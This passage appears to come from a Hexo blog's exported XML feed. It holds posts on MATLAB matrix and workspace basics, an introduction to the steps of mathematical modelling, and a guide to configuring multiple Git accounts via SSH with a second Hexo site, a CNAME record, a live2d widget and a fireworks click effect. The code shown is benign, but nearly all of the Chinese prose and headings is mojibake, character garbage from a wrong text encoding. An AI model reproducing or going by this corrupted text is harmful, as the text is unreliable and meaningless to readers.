alt=""></p></li><li><p>Áü©ÈòµÁöÑÂä†Âáè‰πòÈô§‰ª•ÂèäËΩ¨ÁΩÆÔºàÂÖ±ËΩ≠ËΩ¨ÁΩÆ‰∏∫ b‚Äô ,ÈùûÂÖ±ËΩ≠ËΩ¨ÁΩÆ‰∏∫ËøêÁÆó b.‚ÄôÂØπ‰∫éÂÆûÊï∞Ê≤°ÊúâÂå∫Âà´) ,‰∫∫ÊÄßÂåñÁöÑÊä•ÈîôüòÑÂ•ΩËØÑÔºö</p><p><img src="https://i.loli.net/2018/10/07/5bb95c2d99dcf.png" alt=""></p></li><li><p>Áü©ÈòµÊ±ÇÈÄÜËøêÁÆó inv ÂáΩÊï∞Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95d8d1797d.png" class="lazyload"></p></li><li><p>Ê†ºÂºèÂåñËæìÂá∫ format short(long)Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95e3e30a1b.png" class="lazyload"></p></li><li><p>Áü©ÈòµÊØè‰∏Ä‰∏™ÂÖÉÁ¥†ÁöÑÂπ≥ÊñπÔºàs.*s)ÔºåÁ´ãÊñπ(s.^3)Êìç‰ΩúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95ed30a03c.png" class="lazyload"></p></li><li><p>Áü©ÈòµÁöÑÊâ©ÂÖÖÊìç‰ΩúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb95f5d5a4e8.png" class="lazyload"></p><h3 id="‰∏â-Â∑•‰ΩúÁ©∫Èó¥ÂèòÈáè"><a href="#‰∏â-Â∑•‰ΩúÁ©∫Èó¥ÂèòÈáè" class="headerlink" title="‰∏â. Â∑•‰ΩúÁ©∫Èó¥ÂèòÈáè"></a>‰∏â. Â∑•‰ΩúÁ©∫Èó¥ÂèòÈáè</h3></li><li><p>magic Âíå rand Ôºå‰ª•ÂèäwhosÂëΩ‰ª§</p><p>magicÊòØ‰∏ÄÁßçÁî®‰∫é‰∫ßÁîüÈ≠îÊñπÁü©ÈòµÁöÑÂáΩÊï∞Ôºå‰∫ßÁîüÁöÑÁü©ÈòµÁöÑÊØèË°å„ÄÅÂàó‰ª•ÂèäÂØπËßíÁ∫øÁöÑÊï∞‰πãÂíåÁõ∏Á≠â„ÄÇËØ•ÂíåÁöÑÂÄº‰∏∫1+2+3+‚Ä¶..+n^2ÁöÑÂíåÂÜçÈô§‰ª•nÔºånÂøÖÈ°ª‰∏∫Â§ß‰∫éÊàñÁ≠â‰∫é3ÁöÑÊï¥Êï∞„ÄÇ </p><p>randÂáΩÊï∞ÂàôÁî®‰∫é‰∫ßÁîüÁî±Âú®(0, 1)‰πãÈó¥ÂùáÂåÄÂàÜÂ∏ÉÁöÑÈöèÊú∫Êï∞ÁªÑÊàêÁöÑÊï∞ÁªÑ ÔºåÂ¶ÇrandÔºà4ÔºâÂàôÊòØ‰∫ßÁîü‰∏Ä‰∏™1Ë°å4ÂàóÁöÑÊï∞ÁªÑÔºårandÔºà2Ôºå3ÔºâÂàôÊòØ2Ë°å3ÂàóÁü©ÈòµÔºårandÔºà2Ôºå3Ôºå4ÔºâÂàôÊòØÂõõ‰∏™2Ë°å3ÂàóÁöÑÁü©Èòµ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb961e66a53f.png" class="lazyload"></p></li><li><p>saveÔºåloadÔºåclear ÂëΩ‰ª§„ÄÇsaveÁî®‰∫é‰øùÂ≠òÊï∞ÊçÆÂà∞ matÊñá‰ª∂‰∏≠ÔºåloadÁî®‰∫éÂä†ËΩΩmatÊñá‰ª∂ÔºåclearÂàôÊòØÊ∏ÖÈô§ÂΩìÂâçÂ∑•‰ΩúÂå∫ÂèòÈáè„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9628c75d19.png" class="lazyload"></p></li></ul><h3 id="Âõõ-Â≠óÁ¨¶ÂíåÂ≠óÁ¨¶‰∏≤Êìç‰Ωú"><a href="#Âõõ-Â≠óÁ¨¶ÂíåÂ≠óÁ¨¶‰∏≤Êìç‰Ωú" class="headerlink" title="Âõõ. Â≠óÁ¨¶ÂíåÂ≠óÁ¨¶‰∏≤Êìç‰Ωú"></a>Âõõ. Â≠óÁ¨¶ÂíåÂ≠óÁ¨¶‰∏≤Êìç‰Ωú</h3><ul><li><p>ÂÆö‰πâÂ≠óÁ¨¶ÂíåÂ≠óÁ¨¶‰∏≤Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb963f2ec434.png" class="lazyload"></p></li><li><p>Êï∞Â≠óËΩ¨Â≠óÁ¨¶ÔºåÂ≠óÁ¨¶ÊãºÊé•Ôºàint2str or num2strÂáΩÊï∞ÔºâÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb965001606c.png" class="lazyload"></p><h3 id="‰∫î-Ë∞ÉÁî®ÂáΩÊï∞"><a href="#‰∫î-Ë∞ÉÁî®ÂáΩÊï∞" class="headerlink" title="‰∫î. Ë∞ÉÁî®ÂáΩÊï∞"></a>‰∫î. Ë∞ÉÁî®ÂáΩÊï∞</h3></li><li><p>matlab ÂíåÂ§ßÂ§öÊï∞ÁºñÁ®ãËØ≠Ë®Ä‰∏ÄÊ†∑ÔºåÊèê‰æõ‰∫ÜÂæàÂ§öÂáΩÊï∞Êù•ÁÆÄÂåñ‰ª£Á†ÅÊèêÈ´òÊïàÁéáÔºå‰æãÂ¶ÇÂ∏∏ËßÅÁöÑ minÔºåmaxÂáΩÊï∞Ôºå‰∏îÂáΩÊï∞ÂêåÊ†∑ÂÖ∑ÊúâËøîÂõûÂÄºÁ±ªÂûãÔºå‰∏™Êï∞Á≠âÊù°‰ª∂:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9674e3f44e.png" class="lazyload"></p></li><li><p>zerosÔºåones ÂáΩÊï∞ÔºåÁîüÊàêÁâπÂÆöÁü©ÈòµÔºàÂÖ®Èõ∂ÊàñËÄÖÂÖ®‰∏ÄÔºâÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb967c6a83a3.png" class="lazyload"></p></li><li><p>sizeÔºåsumÂáΩÊï∞ÔºåsizeÁî®‰∫éËÆ°ÁÆóÂ§ßÂ∞èÔºåÂ¶ÇÁü©ÈòµÁöÑË°åÂàóÊï∞ÔºåsumÂàôÁî®‰∫éÊ±ÇÂíåÔºå‰∏§ËÄÖ‰º†ÂèÇÊúâÁõ∏‰ºº‰πãÂ§ÑÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb968c8cee9a.png" class="lazyload"></p></li></ul><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/07/5bb9687d4ff42.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> Êï∞Â≠¶Âª∫Ê®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Êï∞Ê®° </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Êï∞Â≠¶Âª∫Ê®°_day1</title>
      <link href="/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/"/>
      <url>/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Êï∞Â≠¶Âª∫Ê®°-day1‚ÄìÂàùÂÖ•Êï∞Ê®°"><a href="#Êï∞Â≠¶Âª∫Ê®°-day1‚ÄìÂàùÂÖ•Êï∞Ê®°" class="headerlink" title="Êï∞Â≠¶Âª∫Ê®°_day1‚ÄìÂàùÂÖ•Êï∞Ê®°"></a>Êï∞Â≠¶Âª∫Ê®°_day1‚ÄìÂàùÂÖ•Êï∞Ê®°</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; ‰Ωú‰∏∫‰∏Ä‰∏™Â§ß‰∫åÂàöÂºÄÂßãÁöÑÂ≠¶ÁîüÊâçÁúüÊ≠£Êé•Ëß¶Êï∞Ê®°ÔºåËôΩÁÑ∂ÊúâÁÇπÊôö‰∫ÜÔºå‰ΩÜÊàëÁõ∏‰ø°Êúâ‰ªòÂá∫ÔºåÂ∞±ÊúâÂõûÊä•ÔºåÊ≤°Êúâ‰ªòÂá∫Â∞±Ê≤°ÊúâÈ¶ÖÈ•ºüòÑ„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Êï∞Â≠¶Âª∫Ê®°ÊòØ‰ªÄ‰πà‰∏úË•øÂë¢ÔºüÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØÈÄöËøáÊï∞Â≠¶ÁöÑÁ¨¶Âè∑ÂíåËØ≠Ë®Ä‰ΩúË°®Ëø∞Êù•Âª∫Á´ãÊï∞Â≠¶Ê®°ÂûãÔºåËÄåÊ≠§Êï∞Â≠¶Ê®°ÂûãÈ¶ñÂÖàÊòØÊ†πÊçÆÂÆûÈôÖÈóÆÈ¢òÂª∫Á´ãÁöÑÔºåÈÄöËøáËøô‰∏™Âª∫Á´ãÁöÑÊï∞Â≠¶Ê®°ÂûãÔºåÊàë‰ª¨ÂèØ‰ª•ÂéªËß£ÂÜ≥‰∏Ä‰∏™ÂÆûÈôÖÁöÑÈóÆÈ¢òÔºåÂ¶ÇÂÖ±‰∫´ÂçïËΩ¶ÔºåÂüéÂ∏ÇÊéíÊ±°Á≠âÁ≠âÈóÆÈ¢ò„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Êï∞Â≠¶Âª∫Ê®°ÁöÑËøáÁ®ãÂåÖÊã¨Ë°®Ëø∞ÔºåÊ±ÇËß£ÔºåËß£ÈáäÔºåÊ£ÄÈ™åÂõõ‰∏™ËøáÁ®ã„ÄÇÂèØÁªÜÂàÜ‰∏∫‰∏É‰∏™Ê≠•È™§ÔºöÊ®°ÂûãÂáÜÂ§áÔºåÊ®°ÂûãÂÅáËÆæÔºåÊ®°ÂûãÊûÑÊàêÔºåÊ®°ÂûãÊ±ÇËß£ÔºåÊ®°ÂûãÂàÜÊûêÔºåÊ®°ÂûãÊ£ÄÈ™åÔºåÊ®°ÂûãÂ∫îÁî®„ÄÇ</p><h3 id="1-Ê®°ÂûãÂáÜÂ§á"><a href="#1-Ê®°ÂûãÂáÜÂ§á" class="headerlink" title="1.Ê®°ÂûãÂáÜÂ§á"></a>1.Ê®°ÂûãÂáÜÂ§á</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; ‰Ωú‰∏∫Âª∫Ê®°ÁöÑÁ¨¨‰∏ÄÊ≠•ÔºåÊàë‰ª¨È¶ñÂÖàÂ∫îËØ•‰∫ÜËß£ÁªôÂá∫ÁöÑÈÇ£‰∏™ÈóÆÈ¢òÁöÑÂÆûÈôÖËÉåÊôØÔºåÂÜçÊòéÁ°ÆÂª∫Ê®°ÁöÑÁõÆÁöÑÔºå‰ªéËÄåÂèØ‰ª•ÈíàÂØπÊÄßÂú∞ÊêúÈõÜÊúâÂÖ≥ÁöÑ‰ø°ÊÅØÔºåÊéåÊè°Ê®°ÂûãÂØπË±°ÁöÑÁâπÂæÅ‰πãÂêéÔºåÂú®Êàë‰ª¨ËÑëÊµ∑‰∏≠ÂΩ¢Êàê‰∏Ä‰∏™ÊØîËæÉÊ∏ÖÊô∞ÁöÑÈóÆÈ¢ò„ÄÇÊØîÂ¶ÇÂÖ±‰∫´ÂçïËΩ¶ÁöÑÊäïÊîæÈóÆÈ¢òÔºåÈù¢ÂØπËøô‰∏™ÈóÆÈ¢òÊàë‰ª¨È¶ñÂÖàÂ∞±Áü•ÈÅì‰∫ÜÈúÄË¶ÅÂæóÂá∫‰∏Ä‰∏™ÂêàÁêÜÁöÑÊäïÊîæÈáèÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÈúÄË¶Å‰ªéÂ§öÊñπÈù¢Êù•Ëé∑Âèñ‰ø°ÊÅØÔºåÂ¶ÇÂêÑÂú∞‰∫∫Âè£Êï∞ÈáèÔºå‰∫§ÈÄöÊÉÖÂÜµÔºå‰ª•ÂèäÂü∫Á°ÄËÆæÊñΩÂÆåÂñÑÁ®ãÂ∫¶Á≠âÁ≠â‰ø°ÊÅØÔºåÊù•‰∏∞ÂØåËøô‰∏™Ê®°ÂûãÁöÑÁâπÂæÅÔºåËøõËÄåÂª∫Á´ãÂá∫ÂêàÁêÜÁöÑÊ®°ÂûãÊù•Ëß£ÂÜ≥ÂÖ±‰∫´ÂçïËΩ¶ÁöÑÊäïÊîæÈóÆÈ¢ò„ÄÇ<br><img src="https://i.loli.net/2018/10/06/5bb8d2dd91a08.png" alt=""></p><h3 id="2-Ê®°ÂûãÂÅáËÆæ"><a href="#2-Ê®°ÂûãÂÅáËÆæ" class="headerlink" title="2.Ê®°ÂûãÂÅáËÆæ"></a>2.Ê®°ÂûãÂÅáËÆæ</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; Âú®Ê®°ÂûãÂÅáËÆæËøô‰∏ÄÊ≠•‰∏≠ÔºåÂæàÊòéÊòæ‰Ω†Âª∫Á´ãÂá∫Êù•ÁöÑÊ®°ÂûãÊòØÂê¶ÂêàÁêÜÂèñÂÜ≥‰∫éÂÆÉÁöÑÂèØÁî®ÊÄßÔºåÈíàÂØπÈóÆÈ¢òÁöÑÁâπÁÇπÂíåÂª∫Ê®°ÁõÆÁöÑÔºåË¶ÅÂÅöÂá∫ÊúÄÂêàÁêÜÁöÑÊ®°ÂûãÂÅáËÆæÔºåÊÄé‰πà‰∏™ÂêàÁêÜÊ≥ïÂë¢ÔºüÈÇ£Â∞±ÊòØË¶ÅÁ¨¶ÂêàÂÆûÈôÖÊÉÖÂÜµÔºåÂ¶ÇÁâ©Ë¥®ÊàêÊú¨ÔºåÊó∂Èó¥ÊàêÊú¨ÔºåÁ©∫Èó¥ÊàêÊú¨Á≠âÁ≠âÊù°‰ª∂„ÄÇ<br><img src="https://i.loli.net/2018/10/06/5bb8d3068e279.png" alt=""></p><h3 id="3-Ê®°ÂûãÊûÑÊàê"><a href="#3-Ê®°ÂûãÊûÑÊàê" class="headerlink" title="3.Ê®°ÂûãÊûÑÊàê"></a>3.Ê®°ÂûãÊûÑÊàê</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; Ê®°ÂûãÁöÑÊûÑÊàêÂ∞±ÈúÄË¶ÅÊàë‰ª¨Â•ΩÂ•ΩËÆ≤Á©∂‰∫ÜÔºåÊ≠£ÊâÄË∞ìËÆ≤Á©∂ËÄå‰∏çÂ∞ÜÂ∞±ÔºåÂ¶Ç‰ΩïÂú®ÂÆûÈôÖÊÉÖÂÜµ‰∏éÊûÑÊàêÈöæÂ∫¶‰πãÈó¥ÂÅöÂá∫ÊúÄÂêàÈÄÇÁöÑË°®Ëææ‰πüÊòØ‰∏ÄÈó®Ëâ∫ÊúØ„ÄÇËøô‰∏ÄÊ≠•Êàë‰ª¨ÈúÄË¶ÅÂ∞ΩÈáèÈááÁî®ÁÆÄÂçïÊôÆÈÅçÁöÑÊï∞Â≠¶Â∑•ÂÖ∑Êù•ÊûÑÊàêÊ®°Âûã„ÄÇ<br><img src="https://i.loli.net/2018/10/06/5bb8d31f817e6.png" alt=""></p><h3 id="4-Ê®°ÂûãÊ±ÇËß£"><a href="#4-Ê®°ÂûãÊ±ÇËß£" class="headerlink" title="4.Ê®°ÂûãÊ±ÇËß£"></a>4.Ê®°ÂûãÊ±ÇËß£</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; ÈÄöËøáÂêÑÁßçÊï∞Â≠¶ÊñπÊ≥ïÔºåËΩØ‰ª∂ÔºàmatlabÔºåmathematicalÔºålingoÔºâÔºå‰ª•ÂèäËÆ°ÁÆóÊú∫ÁºñÁ®ãÊäÄÊúØÔºåÊù•ÂØπÊ®°ÂûãËøõË°åÈ´òÊïàÁéáÂú∞Ê±ÇËß£„ÄÇ</p><h3 id="5-Ê®°ÂûãÂàÜÊûê"><a href="#5-Ê®°ÂûãÂàÜÊûê" class="headerlink" title="5.Ê®°ÂûãÂàÜÊûê"></a>5.Ê®°ÂûãÂàÜÊûê</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; ÂØπÊ±ÇÂá∫Êù•ÁöÑÁªìÊûúËøõË°åËØØÂ∑ÆÂàÜÊûêÔºåÁªüËÆ°ÂàÜÊûêÔºå‰ª•ÂèäÊ®°ÂûãÂØπÊï∞ÊçÆÁöÑÁ®≥ÂÆöÊÄßÂàÜÊûêÔºàÊú∫Âô®Â≠¶‰π†‰πüÊúâÊ∂âÂèäÔºö1. ËÆ°ÁÆóÁöÑÁ®≥ÂÆöÊÄß(Computational Stability)Ôºõ2. Êï∞ÊçÆÁ®≥ÂÆöÊÄßÔºõ3. ÊÄßËÉΩÁöÑÁ®≥ÂÆöÊÄß [ÂèÇËÄÉÈìæÊé•]: <a href="https://blog.csdn.net/zhouwenyuan1015/article/details/78228818Ôºâ" target="_blank" rel="noopener">https://blog.csdn.net/zhouwenyuan1015/article/details/78228818Ôºâ</a></p><h3 id="6-Ê®°ÂûãÊ£ÄÈ™å"><a href="#6-Ê®°ÂûãÊ£ÄÈ™å" class="headerlink" title="6.Ê®°ÂûãÊ£ÄÈ™å"></a>6.Ê®°ÂûãÊ£ÄÈ™å</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; Êï∞Â≠¶ËÆ≤Á©∂‰∏Ä‰∏™‰∏•Ë∞®ÔºåÂõ†ËÄåÂú®Ê®°ÂûãÊ±ÇËß£‰πãÂêéËøõË°åÊ£ÄÈ™åÈÇ£ÊòØÂøÖÁÑ∂ÁöÑ„ÄÇÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜËß£Âá∫Êù•ÁöÑÊï∞ÊçÆ‰∏éÂÆûÈôÖÁé∞Ë±°ÔºåÁé∞ÂÆûÊï∞ÊçÆÊØîËæÉÔºå‰ªéËÄåÊ£ÄÈ™åÊ®°ÂûãÁöÑÂêàÁêÜÊÄß„ÄÇ</p><h3 id="7-Ê®°ÂûãÂ∫îÁî®"><a href="#7-Ê®°ÂûãÂ∫îÁî®" class="headerlink" title="7.Ê®°ÂûãÂ∫îÁî®"></a>7.Ê®°ÂûãÂ∫îÁî®</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; ÂΩìÊ®°ÂûãËÉΩÂ§üÂæóÂà∞Â∫îÁî®Êó∂ÔºåËØ¥ÊòéËøôÊòØ‰∏™ÊàêÁÜüÁöÑÊ®°Âûã‰∫ÜÔºåËØ•Â≠¶‰ºöËá™Â∑±Ëß£ÂÜ≥ÈóÆÈ¢ò‰∫ÜÔºàËÑëË°• ÊàêÁÜüÁöÑÊ®°Âûã.jpgüòÑ)„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Êï∞Â≠¶Âª∫Ê®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Êï∞Ê®° </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Â§öGitË¥¶Êà∑‰ª•ÂèäHexoÊê≠Âª∫ÂçöÂÆ¢ËøõÈò∂</title>
      <link href="/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/"/>
      <url>/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Â§öGitË¥¶Êà∑‰ª•ÂèäHexoÊê≠Âª∫ÂçöÂÆ¢ËøõÈò∂"><a href="#Â§öGitË¥¶Êà∑‰ª•ÂèäHexoÊê≠Âª∫ÂçöÂÆ¢ËøõÈò∂" class="headerlink" title="Â§öGitË¥¶Êà∑‰ª•ÂèäHexoÊê≠Âª∫ÂçöÂÆ¢ËøõÈò∂"></a>Â§öGitË¥¶Êà∑‰ª•ÂèäHexoÊê≠Âª∫ÂçöÂÆ¢ËøõÈò∂</h1><h2 id="1-ÁîüÊàêÂØÜÈí•"><a href="#1-ÁîüÊàêÂØÜÈí•" class="headerlink" title="1.ÁîüÊàêÂØÜÈí•"></a>1.ÁîüÊàêÂØÜÈí•</h2><blockquote><p><img src="https://i.loli.net/2018/10/04/5bb631dc309a8.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÁîüÊàêÁöÑid_rsaÊòØ0LinkSec gitË¥¶Êà∑ÁöÑÂØÜÈí•</p><p>ËÄåyof3ngÁöÑÂàôÊòØÊàëÂáÜÂ§áÊê≠Âª∫ÁöÑÁ¨¨‰∫å‰∏™hexoÁöÑÂØÜÈí•</p></blockquote><h2 id="2-ÈÖçÁΩÆconfigÊñá‰ª∂"><a href="#2-ÈÖçÁΩÆconfigÊñá‰ª∂" class="headerlink" title="2.ÈÖçÁΩÆconfigÊñá‰ª∂"></a>2.ÈÖçÁΩÆconfigÊñá‰ª∂</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#userName1(yof3ng@gmail.com)0LinkSec Lab</span>Host 0LinkSecHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token comment" spellcheck="true">#userName2 yof3ng@qq.com</span>Host yof3ngHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>yof3ng</code></pre><p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÁº©ËøõÈóÆÈ¢òÔºåÁº©ËøõÂèØËÉΩ‰ºö‰∫ßÁîüÊä•Èîô„ÄÇ</p><p>Âú®github‰∏äÊ∑ªÂä†ÂÆåsshÂØÜÈí•‰πãÂêéÂç≥ÂèØËøõË°å‰∏ã‰∏ÄÊ≠•</p></blockquote><h2 id="3-gitËøûÊé•ÊµãËØï"><a href="#3-gitËøûÊé•ÊµãËØï" class="headerlink" title="3.gitËøûÊé•ÊµãËØï"></a>3.gitËøûÊé•ÊµãËØï</h2><blockquote><p>Á¨¨‰∏Ä‰∏™Ë¥¶Êà∑git@0LinkSecÔºö</p><p><img src="https://i.loli.net/2018/10/04/5bb632d0def6c.png" alt=""></p><p>Á¨¨‰∫å‰∏™Ë¥¶Êà∑git@yof3ngÔºö</p><p><img src="https://i.loli.net/2018/10/04/5bb632ecc2c9c.png" alt=""></p><p>‰∏§‰∏™Ë¥¶Êà∑Â∑≤ÁªèÂª∫Á´ãÊàêÂäüÔºåÊé•‰∏ãÊù•Âç≥ÂèØËøõË°åÁ¨¨‰∫å‰∏™hexoÁöÑÊê≠Âª∫„ÄÇ</p></blockquote><h2 id="4-Á¨¨‰∫å‰∏™hexoÂàùÂßãÂåñÂêéÈÖçÁΩÆ-configÊñá‰ª∂"><a href="#4-Á¨¨‰∫å‰∏™hexoÂàùÂßãÂåñÂêéÈÖçÁΩÆ-configÊñá‰ª∂" class="headerlink" title="4.Á¨¨‰∫å‰∏™hexoÂàùÂßãÂåñÂêéÈÖçÁΩÆ configÊñá‰ª∂"></a>4.Á¨¨‰∫å‰∏™hexoÂàùÂßãÂåñÂêéÈÖçÁΩÆ configÊñá‰ª∂</h2><blockquote><p><img src="https://i.loli.net/2018/10/04/5bb6376eaf144.png" alt=""></p><p>‚Äã    Âº∫Ë∞ÉrepositoryÈ°πÔºöÂ∫îËØ•ËÆæÁΩÆ‰∏∫ÂâçÈù¢ËÆæÁΩÆÁöÑÁ¨¨‰∫åÁî®Êà∑,Ëã•‰∏∫<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>Âàô‰ºöÈªòËÆ§‰∏∫Á¨¨‰∏ÄÁî®Êà∑ÔºåËøûÊé•0LinkSec„ÄÇ</p><p>Âà∞Ê≠§Á¨¨‰∫åhexoÊê≠Âª∫ÊàêÂäü„ÄÇ</p></blockquote><h2 id="5-souceÁõÆÂΩï‰∏ãCNAMEÊñá‰ª∂Âª∫Á´ãÔºå‰ª•ÂèäÂüüÂêçCNAMEËÆ∞ÂΩïÂª∫Á´ã"><a href="#5-souceÁõÆÂΩï‰∏ãCNAMEÊñá‰ª∂Âª∫Á´ãÔºå‰ª•ÂèäÂüüÂêçCNAMEËÆ∞ÂΩïÂª∫Á´ã" class="headerlink" title="5.souceÁõÆÂΩï‰∏ãCNAMEÊñá‰ª∂Âª∫Á´ãÔºå‰ª•ÂèäÂüüÂêçCNAMEËÆ∞ÂΩïÂª∫Á´ã"></a>5.souceÁõÆÂΩï‰∏ãCNAMEÊñá‰ª∂Âª∫Á´ãÔºå‰ª•ÂèäÂüüÂêçCNAMEËÆ∞ÂΩïÂª∫Á´ã</h2><blockquote><p>Âú®ÂüüÂêçËß£ÊûêÂ§ÑÊñ∞Âª∫yof3ng‰∫åÁ∫ßÂüüÂêçCNAMEËÆ∞ÂΩïÔºåÊåáÂêë yof3ng.github.io,‰ª•ÂèäÂú®hexoÊ†πÁõÆÂΩï‰∏ãÁöÑsourceÊñá‰ª∂Â§πÂª∫Á´ãCNAMEÊñá‰ª∂ÔºåÂ∞Üyof3ng.0Link.topÂ°´ÂÖ•ÂÖ∂‰∏≠Âç≥ÂèØ„ÄÇ</p><p><img src="https://i.loli.net/2018/10/05/5bb76525ca26d.png" alt=""></p></blockquote><h2 id="6-ÂºÄÂêØÂº∫Âà∂httpsÊúçÂä°ÈÄâÈ°π"><a href="#6-ÂºÄÂêØÂº∫Âà∂httpsÊúçÂä°ÈÄâÈ°π" class="headerlink" title="6.ÂºÄÂêØÂº∫Âà∂httpsÊúçÂä°ÈÄâÈ°π"></a>6.ÂºÄÂêØÂº∫Âà∂httpsÊúçÂä°ÈÄâÈ°π</h2><p>Âú®github ÂØπÂ∫î‰ªìÂ∫ì‰∏≠ÁöÑsetting‰∏≠ËÆæÁΩÆÂç≥ÂèØ„ÄÇ</p><h2 id="7-Ê∑ªÂä†ËêåÂÆ†Á≤æÁÅµ"><a href="#7-Ê∑ªÂä†ËêåÂÆ†Á≤æÁÅµ" class="headerlink" title="7.Ê∑ªÂä†ËêåÂÆ†Á≤æÁÅµ"></a>7.Ê∑ªÂä†ËêåÂÆ†Á≤æÁÅµ</h2><blockquote><p><a href="https://blog.csdn.net/Aoman_Hao/article/details/82049821" target="_blank" rel="noopener">ÂèÇËÄÉ</a>ÈìæÊé•</p><p>ÂàáÊç¢Âà∞ÂçöÂÆ¢ÁõÆÂΩïÁÑ∂ÂêéËæìÂÖ•Ôºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ÂÆâË£Ölive2d</span>npm install <span class="token operator">-</span><span class="token operator">-</span>save hexo<span class="token operator">-</span>helper<span class="token operator">-</span>live2d<span class="token comment" spellcheck="true">#ÂÆâË£ÖËêåÂÆ†module</span>npm install live2d<span class="token operator">-</span>widget<span class="token operator">-</span>model<span class="token operator">-</span>koharu </code></pre><p>Ê∑ªÂä†Âú®configÊñá‰ª∂ÂÜÖÔºö</p><pre class=" language-shell"><code class="language-shell">live2d:  enable: true  scriptFrom: local  model:    use: live2d-widget-model-koharu  display:    position: right    width: 140    height: 260  mobile:    show: true</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb847f7047c9.png" class="lazyload"></p></blockquote><h2 id="8-Ê∑ªÂä†Èº†Ê†áÁÇπÂáªÁâπÊïà"><a href="#8-Ê∑ªÂä†Èº†Ê†áÁÇπÂáªÁâπÊïà" class="headerlink" title="8.Ê∑ªÂä†Èº†Ê†áÁÇπÂáªÁâπÊïà"></a>8.Ê∑ªÂä†Èº†Ê†áÁÇπÂáªÁâπÊïà</h2><blockquote><p>Ê∑ªÂä†Èº†Ê†áÁÇπÂáªÁàÜÁÇ∏ÊïàÊûúÔºö<br>Âú®‰∏ªÈ¢òÁöÑjsÁõÆÂΩï‰∏ãÂàõÂª∫fireworks.jsÂπ∂ÂÜôÂÖ•Â¶Ç‰∏ã‰ª£Á†Å</p><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span 